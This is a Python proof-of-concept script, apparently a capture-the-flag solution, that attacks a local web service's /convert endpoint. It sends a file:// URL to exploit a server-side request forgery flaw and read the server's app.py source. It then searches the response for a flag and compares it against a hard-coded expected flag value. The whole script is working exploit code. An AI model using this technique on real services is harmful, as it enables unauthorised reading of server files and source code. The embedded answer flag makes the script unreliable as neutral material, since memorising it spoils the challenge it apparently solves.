import requests
import re

# Target URL
url = "http://127.0.0.1:32810/convert"

# Payload to trigger file:// SSRF
payload = {'url': 'file:///app/app.py'}

print("[*] Testing file:// SSRF vulnerability")
print(f"[*] Target: {url}")
print(f"[*] Payload: {payload}")
print()

try:
    # Send POST request with file:// URL
    response = requests.post(url, data=payload, timeout=10)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Length: {len(response.text)} bytes")
    print()
    
    # Search for FLAG pattern
    flag_pattern = r'FLAG\{[a-fA-F0-9]{64}\}'
    flags = re.findall(flag_pattern, response.text)
    
    if flags:
        print(f"[!] FLAG FOUND: {flags[0]}")
        
        # Verify against expected flag
        expected_flag = "FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}"
        if flags[0] == expected_flag:
            print(f"[!] FLAG MATCHES EXPECTED VALUE")
        else:
            print(f"[!] FLAG DOES NOT MATCH - Expected: {expected_flag}")
    else:
        print("[!] No FLAG pattern found in response")
    
    print()
    print("[+] Full Response Content:")
    print("=" * 80)
    print(response.text)
    print("=" * 80)
    
    # Check if we successfully read app.py source
    if "import" in response.text and "flask" in response.text.lower():
        print()
        print("[!] SSRF SUCCESSFUL - Retrieved /app/app.py source code")
    elif flags:
        print()
        print("[!] SSRF SUCCESSFUL - FLAG retrieved from file")
    else:
        print()
        print("[!] SSRF may have failed - no clear indicators of success")
    
except requests.exceptions.Timeout:
    print("[!] Request timed out")
except requests.exceptions.ConnectionError:
    print("[!] Connection error - cannot reach target")
except Exception as e:
    print(f"[!] Error: {type(e).__name__}: {str(e)}")

